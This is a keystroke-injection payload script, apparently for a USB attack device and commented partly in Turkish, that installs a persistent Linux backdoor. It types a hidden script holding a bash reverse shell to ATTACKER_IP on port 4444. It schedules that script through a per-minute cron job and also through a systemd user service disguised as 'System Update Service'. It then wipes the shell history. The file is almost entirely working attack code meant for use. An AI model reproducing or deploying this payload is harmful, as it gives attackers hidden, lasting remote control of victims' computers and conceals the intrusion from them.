// ═══════════════════════════════════════════════════════════════════════════
// Payload: linux_cron_backdoor.js
// Target:  Linux (GUI)
// Time:    ~8 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Cron job ile kalıcı reverse shell
// Her dakika bağlantı dener
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP
var LPORT = "4444";          // Listener port

// Cron zamanlaması
// * * * * * = Her dakika
// */5 * * * * = Her 5 dakika
// 0 * * * * = Her saat başı
var CRON_SCHEDULE = "* * * * *";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
press("CTRL-ALT-t");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: CREATE BACKDOOR SCRIPT                                          │
// └─────────────────────────────────────────────────────────────────────────┘
// Gizli backdoor script oluştur
type("mkdir -p ~/.config/systemd && cat > ~/.config/systemd/.update.sh << 'CRONEOF'");
press("ENTER");
delay(200);
type("#!/bin/bash");
press("ENTER");
type("bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1");
press("ENTER");
type("CRONEOF");
press("ENTER");
delay(500);

// Script'i çalıştırılabilir yap
type("chmod +x ~/.config/systemd/.update.sh");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: ADD CRON JOB                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Mevcut crontab'a ekle
type("(crontab -l 2>/dev/null | grep -v '.update.sh'; echo '" + CRON_SCHEDULE + " ~/.config/systemd/.update.sh') | crontab -");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: ALTERNATIVE - SYSTEMD USER SERVICE (More Stealthy)              │
// └─────────────────────────────────────────────────────────────────────────┘
// Systemd user service olarak da ekle (daha gizli)
type("mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/update.service << 'SVCEOF'");
press("ENTER");
type("[Unit]");
press("ENTER");
type("Description=System Update Service");
press("ENTER");
type("[Service]");
press("ENTER");
type("Type=simple");
press("ENTER");
type("ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1; sleep 60; done'");
press("ENTER");
type("Restart=always");
press("ENTER");
type("RestartSec=60");
press("ENTER");
type("[Install]");
press("ENTER");
type("WantedBy=default.target");
press("ENTER");
type("SVCEOF");
press("ENTER");
delay(500);

// Systemd user service'i aktifle
type("systemctl --user daemon-reload 2>/dev/null");
press("ENTER");
delay(300);
type("systemctl --user enable update.service 2>/dev/null");
press("ENTER");
delay(300);
type("systemctl --user start update.service 2>/dev/null");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("history -c && exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PERSISTENCE LOCATIONS                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Cron: crontab -l
// Script: ~/.config/systemd/.update.sh
// Systemd: ~/.config/systemd/user/update.service
// 
// Kaldırmak için:
// crontab -r
// systemctl --user disable update.service
// rm -rf ~/.config/systemd/

